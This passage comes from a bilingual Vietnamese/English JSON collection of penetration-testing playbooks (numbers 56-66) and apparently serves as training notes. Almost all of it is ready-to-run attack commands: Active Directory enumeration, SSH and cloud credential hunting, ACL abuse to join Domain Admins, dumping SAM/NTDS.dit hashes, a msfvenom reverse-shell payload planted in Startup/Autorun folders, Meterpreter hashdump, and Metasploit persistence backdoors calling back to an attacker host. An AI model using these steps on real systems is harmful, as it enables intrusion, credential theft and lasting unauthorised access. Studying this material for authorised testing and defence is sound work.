    "content": "## Playbook 56: AD Enum - Ph√¢n t√≠ch ƒê∆∞·ªùng t·∫•n c√¥ng BloodHound üó∫Ô∏è‚û°Ô∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** ƒê√£ import d·ªØ li·ªáu SharpHound.\n\n**M·ª•c ti√™u:** T√¨m ƒë∆∞·ªùng t·∫•n c√¥ng l√™n Domain Admins.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ch·∫°y BloodHound:** `neo4j`, `bloodhound`.\n2.  **Ph√¢n t√≠ch Node:** T√¨m node ngu·ªìn, node ƒë√≠ch (Domain Admins).\n3.  **T√¨m ƒê∆∞·ªùng T·∫•n C√¥ng:** Click bi·ªÉu t∆∞·ª£ng Attack Paths.\n4.  **Ph√¢n t√≠ch:** Xem x√©t c√°c quan h·ªá (MemberOf, AdminTo, HasSession, ACLs).\n5.  **S·ª≠ d·ª•ng Queries:** Ch·∫°y truy v·∫•n t√≠ch h·ª£p (`Find Shortest Paths...`, `Find Kerberoastable Users`...).",
    "steps": [
      { "vi": "**Ch·∫°y BloodHound:**", "en": "**Run BloodHound:**", "command": "sudo neo4j start; bloodhound" },
      { "vi": "**Ch·ªçn Node Ngu·ªìn & ƒê√≠ch:**", "en": "**Select Source & Target Nodes:**", "command": "# Find your user/computer node, Find 'Domain Admins', Mark as Target" },
      { "vi": "**T√¨m ƒê∆∞·ªùng T·∫•n C√¥ng:**", "en": "**Find Attack Paths:**", "command": "# Click Attack Paths icon" },
      { "vi": "**Ph√¢n t√≠ch Quan h·ªá:**", "en": "**Analyze Relationships:**", "command": "# Examine MemberOf, AdminTo, HasSession, GenericAll etc." },
      { "vi": "**Ch·∫°y Truy v·∫•n T√≠ch h·ª£p:**", "en": "**Run Built-in Queries:**", "command": "# Go to Queries tab, run relevant queries" }
    ],
    "related_knowledge_ids": ["ad_pentest_enum_bloodhound", "bloodhound", "sharphound", "neo4j", "domain_admins", "kerberoasting", "acl"]
  },
  "playbook_57_ad_enum_powerview_focus": {
    "title": {
      "vi": "Playbook 57: AD Enumeration - PowerView Focus",
      "en": "Playbook 57: AD Enumeration - PowerView Focus"
    },
    "assumption": "C√≥ shell PowerShell tr√™n m√°y join domain, c√≥ `PowerView.ps1`.",
    "objective": "S·ª≠ d·ª•ng PowerView ƒë·ªÉ thu th·∫≠p th√¥ng tin AD chi ti·∫øt.",
    "tools": ["powershell", "powerview"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration"],
    "targets": ["Active Directory Domain"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "enumeration", "powerview", "powershell", "get-netuser", "get-netgroup", "get-netcomputer", "get-objectacl", "get-netgpo"],
    "content": "## Playbook 57: AD Enum - PowerView Focus üïµÔ∏è‚Äç‚ôÇÔ∏èüîé\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell PowerShell, c√≥ `PowerView.ps1`.\n\n**M·ª•c ti√™u:** Thu th·∫≠p th√¥ng tin AD chi ti·∫øt b·∫±ng PowerView.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Import Module:** `Import-Module .\\PowerView.ps1`.\n2.  **Domain/Forest Info:** `Get-NetDomain`, `Get-NetDomainController`, `Get-DomainPolicy`.\n3.  **Users:** `Get-NetUser`, `Get-NetUser -SPN`, `Get-DomainUser -PreauthNotRequired`.\n4.  **Groups:** `Get-NetGroup`, `Get-NetGroupMember \"Domain Admins\"`.\n5.  **Computers:** `Get-NetComputer`.\n6.  **Access Rights:** `Find-LocalAdminAccess`, `Get-NetSession`, `Get-ObjectAcl`, `Find-InterestingDomainAcl`.\n7.  **GPOs:** `Get-NetGPO`.\n8.  **Trusts:** `Get-NetDomainTrust`.",
    "steps": [
      { "vi": "**Import Module:**", "en": "**Import Module:**", "command": "Import-Module .\\PowerView.ps1" },
      { "vi": "**L·∫•y Th√¥ng tin Domain:**", "en": "**Get Domain Info:**", "command": "Get-NetDomain" },
      { "vi": "**Li·ªát k√™ Users:**", "en": "**List Users:**", "command": "Get-NetUser | select cn,description,pwdlastset" },
      { "vi": "**T√¨m User Kerberoastable:**", "en": "**Find Kerberoastable Users:**", "command": "Get-NetUser -SPN" },
      { "vi": "**Xem Th√†nh vi√™n Domain Admins:**", "en": "**View Domain Admins Members:**", "command": "Get-NetGroupMember -GroupName \"Domain Admins\"" },
      { "vi": "**T√¨m Quy·ªÅn Admin Local:**", "en": "**Find Local Admin Access:**", "command": "Find-LocalAdminAccess" },
      { "vi": "**Ki·ªÉm tra ACL c·ªßa User:**", "en": "**Check User ACL:**", "command": "Get-ObjectAcl -Identity <username> -ResolveGUIDs" }
    ],
    "related_knowledge_ids": ["ad_pentest_enum_powerview", "powershell", "powerview", "Get-NetDomain", "Get-NetUser", "Get-NetGroup", "Get-NetComputer", "ad_enum_spn", "ad_pentest_enum_powerview", "ad_enum_powerview_loggedon", "ad_enum_object_permissions_acl", "Get-NetGPO"]
  },
  "playbook_58_postex_linux_find_keys": {
    "title": {
      "vi": "Playbook 58: Linux Post-Exploitation - T√¨m v√† S·ª≠ d·ª•ng SSH Keys",
      "en": "Playbook 58: Linux Post-Exploitation - Finding and Using SSH Keys"
    },
    "assumption": "ƒê√£ c√≥ shell (user ho·∫∑c root) tr√™n Linux.",
    "objective": "T√¨m SSH private keys v√† s·ª≠ d·ª•ng ch√∫ng ƒë·ªÉ di chuy·ªÉn ngang.",
    "tools": ["find", "cat", "ssh", "ssh2john", "john"],
    "phases": ["Post Exploitation", "Lateral Movement", "Credential Access"],
    "techniques": ["Credential Hunting", "SSH Key Discovery", "Lateral Movement"],
    "targets": ["SSH Private Keys", "Other Linux Machines"],
    "os": ["Linux"],
    "tags": ["linux", "post exploitation", "credential hunting", "ssh key", "id_rsa", "find", "lateral movement", "ssh", "ssh2john", "john"],
    "content": "## Playbook 58: Linux Post-Ex - T√¨m v√† S·ª≠ d·ª•ng SSH Keys üïµÔ∏è‚Äç‚ôÇÔ∏èüîë‚û°Ô∏èüö∂‚Äç‚ôÇÔ∏è\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell tr√™n Linux.\n\n**M·ª•c ti√™u:** T√¨m SSH private keys v√† d√πng ƒë·ªÉ di chuy·ªÉn ngang.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m Keys:** `find /home /root -name 'id_rsa*' 2>/dev/null`.\n2.  **L·∫•y Key:** `cat /path/to/id_rsa`, copy v·ªÅ Kali, `chmod 600`.\n3.  **Crack Passphrase:** N·∫øu key m√£ h√≥a, `ssh2john key > hash`, `john --wordlist=wl hash`.\n4.  **X√°c ƒë·ªãnh M·ª•c ti√™u:** T√¨m g·ª£i √Ω trong `known_hosts`, history.\n5.  **Th·ª≠ ƒêƒÉng nh·∫≠p:** `ssh -i key user@<target_ip>`.",
    "steps": [
      { "vi": "**T√¨m Keys:**", "en": "**Find Keys:**", "command": "find /home /root -name 'id_rsa*' 2>/dev/null" },
      { "vi": "**Copy Key v·ªÅ Kali & Chmod:**", "en": "**Copy Key to Kali & Chmod:**", "command": "cat /path/to/id_rsa # (Copy content); chmod 600 keyfile_on_kali" },
      { "vi": "**Crack Passphrase (N·∫øu c·∫ßn):**", "en": "**Crack Passphrase (If needed):**", "command": "ssh2john keyfile_on_kali > key.hash; john --wordlist=wl.txt key.hash" },
      { "vi": "**Th·ª≠ ƒêƒÉng nh·∫≠p:**", "en": "**Attempt Login:**", "command": "ssh -i keyfile_on_kali <user>@<target_ip>" }
    ],
    "related_knowledge_ids": ["linuxprivesc_manual_password_loot", "linux_important_locations_users_auth", "find", "cat", "ssh", "ssh_enumeration_attack", "chmod", "ssh2john", "john", "password_cracking_ssh_key_passphrase"]
  },
  "playbook_59_postex_windows_find_keys": {
    "title": {
      "vi": "Playbook 59: Windows Post-Exploitation - T√¨m Keys v√† Configs",
      "en": "Playbook 59: Windows Post-Exploitation - Finding Keys and Configs"
    },
    "assumption": "ƒê√£ c√≥ shell (user ho·∫∑c Admin/SYSTEM) tr√™n Windows.",
    "objective": "T√¨m ki·∫øm keys (SSH, API), file c·∫•u h√¨nh, th√¥ng tin nh·∫°y c·∫£m.",
    "tools": ["dir", "findstr", "Get-ChildItem", "type", "reg query"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["File Searching", "Registry Searching", "Credential Hunting"],
    "targets": ["Configuration Files", "SSH Keys", "API Keys", "User Directories", "Registry"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "credential hunting", "findstr", "get-childitem", "sensitive files", "ssh keys", "api keys", "config files", "registry"],
    "content": "## Playbook 59: Windows Post-Ex - T√¨m Keys v√† Configs üïµÔ∏è‚Äç‚ôÄÔ∏èüîëüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell tr√™n Windows.\n\n**M·ª•c ti√™u:** T√¨m keys, configs nh·∫°y c·∫£m.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m SSH Keys:** `dir C:\\Users\\*\\.ssh\\* /s /b`.\n2.  **T√¨m AWS Creds:** `dir C:\\Users\\*\\.aws\\credentials /s /b`.\n3.  **T√¨m File Config:** `dir C:\\*.config /s /b`, `Get-ChildItem ... | Select-String 'key','secret'`.\n4.  **T√¨m theo T·ª´ kh√≥a:** `findstr /spin \"apikey\" C:\\*.* /L`.\n5.  **T√¨m trong Registry:** `reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s`.",
    "steps": [
      { "vi": "**T√¨m SSH Keys:**", "en": "**Find SSH Keys:**", "command": "dir C:\\Users\\*\\.ssh\\id_rsa* /s /b" },
      { "vi": "**T√¨m AWS Creds:**", "en": "**Find AWS Creds:**", "command": "dir C:\\Users\\*\\.aws\\credentials /s /b" },
      { "vi": "**T√¨m File Config:**", "en": "**Find Config Files:**", "command": "dir C:\\*.config C:\\inetpub\\wwwroot\\web.config /s /b" },
      { "vi": "**T√¨m N·ªôi dung File (PS):**", "en": "**Find File Content (PS):**", "command": "Get-ChildItem -Path C:\\ -Include *.config,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password','key'" },
      { "vi": "**T√¨m Putty Sessions (Registry):**", "en": "**Find Putty Sessions (Registry):**", "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s" }
    ],
    "related_knowledge_ids": ["dir", "findstr", "Get-ChildItem", "type", "reg query", "linux_important_locations_users_auth", "playbook_26_windows_postex_find_sensitive", "winprivesc_password_hunting_files", "winprivesc_password_hunting_registry"]
  },
  "playbook_60_ad_acl_abuse": {
    "title": {
      "vi": "Playbook 60: AD Attack - L·∫°m d·ª•ng ACL Nguy hi·ªÉm",
      "en": "Playbook 60: AD Attack - Dangerous ACL Abuse"
    },
    "assumption": "C√≥ shell user join domain. Enum (BloodHound, PowerView) ph√°t hi·ªán quy·ªÅn ghi nguy hi·ªÉm (GenericAll, GenericWrite, WriteDacl, ...) tr√™n user/group ƒë·∫∑c quy·ªÅn.",
    "objective": "L·∫°m d·ª•ng quy·ªÅn ACL ƒë·ªÉ leo thang ƒë·∫∑c quy·ªÅn AD.",
    "tools": ["powerview", "powershell (Active Directory Module)", "net user", "net group"],
    "phases": ["Privilege Escalation", "Lateral Movement"],
    "techniques": ["ACL Abuse", "Active Directory Privilege Escalation"],
    "targets": ["Active Directory Objects (Users, Groups)", "ACLs"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "privesc", "acl", "acl abuse", "genericall", "genericwrite", "writedacl", "self-membership", "powerview", "bloodhound"],
    "content": "## Playbook 60: AD Attack - L·∫°m d·ª•ng ACL Nguy hi·ªÉm üè∞üîì‚û°Ô∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** User c√≥ quy·ªÅn ghi nguy hi·ªÉm tr√™n user/group ƒë·∫∑c quy·ªÅn.\n\n**M·ª•c ti√™u:** L·∫°m d·ª•ng ACL ƒë·ªÉ leo thang ƒë·∫∑c quy·ªÅn AD.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán (T√πy quy·ªÅn):**\n\n1.  **X√°c ƒë·ªãnh Quy·ªÅn:** `Get-ObjectAcl -Identity <Target>`.\n2.  **L·∫°m d·ª•ng:**\n    * `GenericAll/WriteDacl` (Group): `Add-DomainGroupMember -Identity \"DA\" -Members <User>`.\n    * `GenericAll/Write/...` (User): `Set-DomainUserPassword -Identity <Target> -Password '<New>'`.\n    * `Self-Membership` (Group): `Add-DomainGroupMember -Identity \"Group\" -Members <Self>`.\n    * `WriteProperty (SPN)`: `Set-DomainObject -Identity <Target> -Set @{spn='Fake/Any'}` -> Kerberoast.",
    "steps": [
      { "vi": "**Ki·ªÉm tra ACL (PowerView):**", "en": "**Check ACL (PowerView):**", "command": "Get-ObjectAcl -Identity <TargetObject> -ResolveGUIDs" },
      { "vi": "**Th√™m User v√†o Group (GenericAll/WriteDacl/Self):**", "en": "**Add User to Group (GenericAll/WriteDacl/Self):**", "command": "Add-DomainGroupMember -Identity \"Domain Admins\" -Members <CurrentUser>" },
      { "vi": "**Reset Password User (GenericWrite/Force):**", "en": "**Reset User Password (GenericWrite/Force):**", "command": "Set-DomainUserPassword -Identity <TargetUser> -Password '<NewPassword>'" },
      { "vi": "**Set SPN (WriteProperty):** -> Kerberoast", "en": "**Set SPN (WriteProperty):** -> Kerberoast", "command": "Set-DomainObject -Identity <TargetUser> -Set @{serviceprincipalname='FakeService/Anything'}" }
    ],
    "related_knowledge_ids": ["ad_enum_object_permissions_acl", "acl", "powerview", "Get-ObjectAcl", "Add-DomainGroupMember", "Set-DomainUserPassword", "net user", "net group", "ad_attack_kerberoasting", "Set-DomainObject"]
  },
 // Playbooks 61-90
  "playbook_61_windows_privesc_sebackupprivilege": {
    "title": {
      "vi": "Playbook 61: Windows PrivEsc qua SeBackupPrivilege",
      "en": "Playbook 61: Windows PrivEsc via SeBackupPrivilege"
    },
    "assumption": "C√≥ shell user Windows. `whoami /priv` cho th·∫•y user c√≥ `SeBackupPrivilege` ƒë∆∞·ª£c b·∫≠t (th∆∞·ªùng l√† th√†nh vi√™n nh√≥m Backup Operators).",
    "objective": "L·∫°m d·ª•ng SeBackupPrivilege ƒë·ªÉ sao ch√©p file SAM v√† SYSTEM hives (ho·∫∑c NTDS.dit n·∫øu l√† DC) nh·∫±m dump hash offline.",
    "tools": ["whoami", "reg", "copy", "impacket-secretsdump"],
    "phases": ["Privilege Escalation", "Credential Access"],
    "techniques": ["Privilege Abuse", "SeBackupPrivilege", "Offline Hash Dumping"],
    "targets": ["SAM Hive", "SYSTEM Hive", "NTDS.dit"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "sebackupprivilege", "privilege abuse", "backup operators", "sam dump", "system hive", "ntds.dit", "offline hash dump", "impacket-secretsdump"],
    "content": "## Playbook 61: Windows PrivEsc qua SeBackupPrivilege üíª‚¨ÜÔ∏èüíæ‚û°Ô∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** User c√≥ `SeBackupPrivilege`.\n\n**M·ª•c ti√™u:** Sao ch√©p SAM/SYSTEM/NTDS.dit v√† dump hash offline.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Privilege:** `whoami /priv`.\n2.  **Sao ch√©p Hives (S·ª≠ d·ª•ng `reg save` ho·∫∑c `copy /B`):**\n    ```powershell\n    reg save hklm\\sam C:\\Windows\\Temp\\sam.hive /y \n    reg save hklm\\system C:\\Windows\\Temp\\system.hive /y \n    # copy C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit /B /Y # (N·∫øu l√† DC)\n    ```\n3.  **T·∫£i Hives v·ªÅ Kali:** S·ª≠ d·ª•ng HTTP upload server ho·∫∑c SMB server.\n4.  **Dump Hashes Offline:**\n    ```bash\n    impacket-secretsdump -sam sam.hive -system system.hive LOCAL \n    # impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL # (N·∫øu l√† DC)\n    ```\n5.  **S·ª≠ d·ª•ng Hash:** D√πng hash Admin/SYSTEM/krbtgt cho PtH ho·∫∑c Golden Ticket.",
    "steps": [
      {"vi": "**X√°c nh·∫≠n Privilege:**", "en": "**Confirm Privilege:**", "command": "whoami /priv"},
      {"vi": "**Sao ch√©p SAM:**", "en": "**Copy SAM:**", "command": "reg save hklm\\sam C:\\Windows\\Temp\\sam.hive /y"},
      {"vi": "**Sao ch√©p SYSTEM:**", "en": "**Copy SYSTEM:**", "command": "reg save hklm\\system C:\\Windows\\Temp\\system.hive /y"},
      {"vi": "**Sao ch√©p NTDS.dit (N·∫øu l√† DC):**", "en": "**Copy NTDS.dit (If DC):**", "command": "copy C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit /B /Y"},
      {"vi": "**T·∫£i Hives v·ªÅ Kali:**", "en": "**Download Hives to Kali:**", "command": "# Use HTTP Upload Server or SMB Server"},
      {"vi": "**Dump Hashes (SAM/SYSTEM - Kali):**", "en": "**Dump Hashes (SAM/SYSTEM - Kali):**", "command": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL"},
      {"vi": "**Dump Hashes (NTDS.dit - Kali):**", "en": "**Dump Hashes (NTDS.dit - Kali):**", "command": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL"},
      {"vi": "**S·ª≠ d·ª•ng Hash:**", "en": "**Use Hashes:**", "command": "# Use for PtH (Playbook 25) or Golden Ticket (Playbook 27)"}
    ],
    "related_knowledge_ids": ["winprivesc_exploits_theory", "whoami /priv", "reg save", "copy", "winprivesc_other_vectors", "ad_attack_shadow_copies", "file_transfer_http_download", "file_transfer_smb_download", "impacket-secretsdump", "winprivesc_sam_system_dump"]
  },
  "playbook_62_windows_privesc_startup_autorun": {
    "title": {
      "vi": "Playbook 62: Windows PrivEsc qua Writable Startup/Autorun",
      "en": "Playbook 62: Windows PrivEsc via Writable Startup/Autorun"
    },
    "assumption": "C√≥ shell user Windows. Ph√°t hi·ªán th∆∞ m·ª•c Startup (`C:\\ProgramData\\...\\StartUp`) ho·∫∑c m·ªôt registry key Autorun (`HKLM\\...\\Run`) tr·ªè ƒë·∫øn v·ªã tr√≠ c√≥ quy·ªÅn ghi.",
    "objective": "Leo thang quy·ªÅn b·∫±ng c√°ch ƒë·∫∑t payload v√†o v·ªã tr√≠ Startup/Autorun ƒë·ªÉ th·ª±c thi khi admin ƒëƒÉng nh·∫≠p.",
    "tools": ["icacls", "accesschk.exe", "reg query", "msfvenom", "nc"],
    "phases": ["Privilege Escalation", "Persistence"],
    "techniques": ["Startup Folder Abuse", "Autorun Abuse", "Insecure File Permissions", "Persistence"],
    "targets": ["Windows Startup Folder", "Registry Autorun Keys"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "persistence", "startup folder", "autorun", "registry", "insecure permissions", "msfvenom"],
    "content": "## Playbook 62: Windows PrivEsc qua Writable Startup/Autorun üíª‚¨ÜÔ∏èüöÄ\n\n**Gi·∫£ ƒë·ªãnh:** Th∆∞ m·ª•c Startup ho·∫∑c v·ªã tr√≠ Autorun c√≥ quy·ªÅn ghi.\n\n**M·ª•c ti√™u:** Leo thang khi admin ƒëƒÉng nh·∫≠p.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh V·ªã tr√≠ & Quy·ªÅn ghi:**\n    * Startup: `icacls \"C:\\ProgramData\\...\\StartUp\"`.\n    * Autorun: `reg query HKLM\\...\\Run`, `icacls \"C:\\Path\\App.exe\"`.\n2.  **T·∫°o Payload:** `msfvenom ... -o startup.exe`.\n3.  **ƒê·∫∑t Payload:** Copy v√†o Startup folder ho·∫∑c thay th·∫ø file Autorun.\n4.  **M·ªü Listener:** `rlwrap nc -lvnp 4447`.\n5.  **Ch·ªù ƒêƒÉng nh·∫≠p:** ƒê·ª£i admin ƒëƒÉng nh·∫≠p.",
    "steps": [
      {"vi": "**Ki·ªÉm tra Quy·ªÅn ghi Startup Folder:**", "en": "**Check Startup Folder Write Permissions:**", "command": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""},
      {"vi": "**Ki·ªÉm tra Quy·ªÅn ghi File Autorun:**", "en": "**Check Autorun File Write Permissions:**", "command": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run; icacls \"C:\\Path\\To\\Autorun\\App.exe\""},
      {"vi": "**T·∫°o Payload:**", "en": "**Create Payload:**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4447 -f exe -o startup.exe"},
      {"vi": "**ƒê·∫∑t Payload v√†o Startup:**", "en": "**Place Payload in Startup:**", "command": "copy startup.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\""},
      {"vi": "**Ho·∫∑c Thay th·∫ø File Autorun:**", "en": "**Or Replace Autorun File:**", "command": "copy C:\\Path\\To\\Autorun\\App.exe C:\\Windows\\Temp\\App.bak; copy C:\\Windows\\Temp\\startup.exe C:\\Path\\To\\Autorun\\App.exe /Y"},
      {"vi": "**M·ªü Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4447"},
      {"vi": "**Ch·ªù Admin ƒêƒÉng nh·∫≠p:**", "en": "**Wait for Admin Login:**"}
    ],
    "related_knowledge_ids": ["winprivesc_startup_apps", "winprivesc_autorun", "icacls", "reg query", "accesschk.exe", "winprivesc_weak_registry_permissions", "msfvenom", "rce_kali_setup", "persistence"]
  },
  "playbook_63_metasploit_post_hashdump": {
    "title": {
      "vi": "Playbook 63: Metasploit Post-Ex - Dump Hashes (hashdump)",
      "en": "Playbook 63: Metasploit Post-Ex - Dump Hashes (hashdump)"
    },
    "assumption": "ƒê√£ c√≥ session Meterpreter v·ªõi quy·ªÅn SYSTEM tr√™n Windows.",
    "objective": "S·ª≠ d·ª•ng module `post/windows/gather/hashdump` ho·∫∑c l·ªánh `hashdump` ƒë·ªÉ tr√≠ch xu·∫•t NTLM hashes t·ª´ SAM.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Dumping", "SAM Dumping"],
    "targets": ["SAM Database"],
    "os": ["Windows"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "credential dumping", "hashdump", "sam dump", "ntlm hash"],
    "content": "## Playbook 63: Metasploit Post-Ex - Dump Hashes üïµÔ∏è‚Äç‚ôÄÔ∏èüîë (MSF)\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ Meterpreter session SYSTEM.\n\n**M·ª•c ti√™u:** Dump NTLM hashes t·ª´ SAM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ki·ªÉm tra Quy·ªÅn:** `getuid`, `getsystem` (n·∫øu c·∫ßn).\n2.  **Dump Hashes (L·ªánh):** `hashdump`.\n3.  **Dump Hashes (Module Post):** `use post/windows/gather/hashdump`, `set SESSION <id>`, `run`.\n4.  **L∆∞u Hashes & S·ª≠ d·ª•ng:** D√πng cho PtH ho·∫∑c crack.",
    "steps": [
      {"vi": "**Ki·ªÉm tra Quy·ªÅn (Meterpreter):**", "en": "**Check Privileges (Meterpreter):**", "command": "getuid"},
      {"vi": "**Th·ª≠ L·∫•y SYSTEM (Meterpreter):**", "en": "**Attempt Getsystem (Meterpreter):**", "command": "getsystem"},
      {"vi": "**Dump Hashes (L·ªánh Meterpreter):**", "en": "**Dump Hashes (Meterpreter Command):**", "command": "hashdump"},
      {"vi": "**Dump Hashes (Module Post):**", "en": "**Dump Hashes (Post Module):**", "command": "use post/windows/gather/hashdump; set SESSION <id>; run"},
      {"vi": "**S·ª≠ d·ª•ng Hashes:**", "en": "**Use Hashes:**", "command": "# Use for PtH (Playbook 25) or offline cracking"}
    ],
    "related_knowledge_ids": ["metasploit", "meterpreter", "post_exploitation", "credential_dumping", "hashdump", "sam_dump", "ntlm_hash", "getsystem", "metasploit_post_exploitation_lab_getsystem_migrate", "metasploit_post_exploitation_modules"]
  },
  "playbook_64_metasploit_post_persistence": {
    "title": {
      "vi": "Playbook 64: Metasploit Post-Ex - Persistence Module",
      "en": "Playbook 64: Metasploit Post-Ex - Persistence Module"
    },
    "assumption": "ƒê√£ c√≥ session Meterpreter (Admin/SYSTEM) tr√™n Windows.",
    "objective": "S·ª≠ d·ª•ng module persistence c·ªßa Metasploit ƒë·ªÉ thi·∫øt l·∫≠p backdoor.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Persistence"],
    "techniques": ["Persistence"],
    "targets": ["Windows System"],
    "os": ["Windows"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "persistence", "backdoor"],
    "content": "## Playbook 64: Metasploit Post-Ex - Persistence üìåü§ñ (MSF)\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ Meterpreter session Admin/SYSTEM.\n\n**M·ª•c ti√™u:** Thi·∫øt l·∫≠p persistence b·∫±ng module MSF.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ch·∫°y Module Persistence (Meterpreter):** `run persistence -X -i 60 -p <LPORT> -r <LHOST>`.\n2.  **Thi·∫øt l·∫≠p Handler (MSF Console):** `use multi/handler`, `set PAYLOAD ...`, `set LHOST/LPORT`, `run -j`.\n3.  **Ki·ªÉm tra:** Ch·ªù k·∫øt n·ªëi l·∫°i.",
    "steps": [
      {"vi": "**Ch·∫°y Persistence (Meterpreter):**", "en": "**Run Persistence (Meterpreter):**", "command": "run persistence -X -i 60 -p 4433 -r <kali_ip>" },
      {"vi": "**Thi·∫øt l·∫≠p Handler (MSF Console):**", "en": "**Setup Handler (MSF Console):**", "command": "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <kali_ip>; set LPORT 4433; run -j" },
      {"vi": "**Ch·ªù K·∫øt n·ªëi l·∫°i:**", "en": "**Wait for Reconnect:**", "command": "# Wait for new session"}
    ],
    "related_knowledge_ids": ["metasploit", "meterpreter", "post_exploitation", "persistence", "multi_handler", "metasploit_msfvenom_handler"]
  },
  "playbook_65_metasploit_rc_script": {
    "title": {
      "vi": "Playbook 65: Metasploit Automation - Resource Script (.rc)",
      "en": "Playbook 65: Metasploit Automation - Resource Script (.rc)"
    },
    "assumption": "Bi·∫øt tr∆∞·ªõc exploit module, payload v√† c√°c tham s·ªë c·∫ßn thi·∫øt.",
    "objective": "T·ª± ƒë·ªông h√≥a vi·ªác ch·∫°y exploit/handler b·∫±ng resource script.",
    "tools": ["metasploit", "text editor"],
    "phases": ["Exploitation", "Automation"],
    "techniques": ["Automation", "Resource Script"],
    "targets": ["Metasploit Workflow"],
    "os": ["Any (Kali)"],
    "tags": ["metasploit", "automation", "resource script", "rc script"],
    "content": "## Playbook 65: Metasploit Automation - Resource Script ü§ñüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** Bi·∫øt exploit module v√† tham s·ªë.\n\n**M·ª•c ti√™u:** T·ª± ƒë·ªông h√≥a exploit b·∫±ng file `.rc`.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T·∫°o File `.rc`:** Ch·ª©a c√°c l·ªánh `msfconsole` (use, set, exploit -j -z).\n2.  **Ch·∫°y MSF:** `msfconsole -r <script_name>.rc`.\n3.  **Qu·∫£n l√Ω Sessions:** `sessions -l`, `sessions -i <id>`.",
    "steps": [
      {"vi": "**T·∫°o File RC:**", "en": "**Create RC File:**", "command": "nano exploit.rc # (Add msfconsole commands like: use ..., set ..., exploit -j -z)"},
      {"vi": "**Ch·∫°y MSF v·ªõi RC:**", "en": "**Run MSF with RC:**", "command": "msfconsole -r exploit.rc"},
      {"vi": "**Ki·ªÉm tra Sessions:**", "en": "**Check Sessions:**", "command": "sessions -l"}
    ],
    "related_knowledge_ids": ["metasploit_automation_resource_scripts", "metasploit", "msfconsole", "exploit", "multi_handler", "sessions"]
  },
  "playbook_66_hashcat_custom_rule": {
    "title": {
      "vi": "Playbook 66: Password Cracking - T·∫°o Hashcat Rule T√πy ch·ªânh",
      "en": "Playbook 66: Password Cracking - Creating Custom Hashcat Rule"
    },
    "assumption": "Nghi ng·ªù m·∫≠t kh·∫©u theo m·ªôt m·∫´u c·ª• th·ªÉ.",
    "objective": "T·∫°o file rule Hashcat ƒë·ªÉ bi·∫øn ƒë·ªïi wordlist theo m·∫´u.",
    "tools": ["hashcat", "text editor"],
    "phases": ["Credential Access"],
    "techniques": ["Password Cracking", "Wordlist Mutation", "Hashcat Rules"],
    "targets": ["Password Hashes"],
    "os": ["Any (Kali)"],
    "tags": ["password cracking", "hashcat", "rules", "wordlist mutation", "password policy"],
    "content": "## Playbook 66: Password Cracking - Hashcat Rule T√πy ch·ªânh üî®üîë\n\n**Gi·∫£ ƒë·ªãnh:** M·∫≠t kh·∫©u theo m·∫´u: `Word2025!`.\n\n**M·ª•c ti√™u:** T·∫°o rule Hashcat cho m·∫´u n√†y.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ph√¢n t√≠ch M·∫´u:** `Word` -> `c` (Capitalize) -> `$2 $0 $2 $5` (Append 2025) -> `$!` (Append !).\n2.  **T·∫°o File Rule:** `myrule.rule` ch·ª©a `c $2 $0 $2 $5 $!`.\n3.  **Ch·∫°y Hashcat:** `hashcat -m <mode> ... -r myrule.rule`.\n4.  **Ki·ªÉm tra:** `hashcat ... --show`.",
    "steps": [
      {"vi": "**Ph√¢n t√≠ch M·∫´u M·∫≠t kh·∫©u:**", "en": "**Analyze Password Pattern:**", "command": "# Example: Word -> Capitalize -> Append Year -> Append !" },
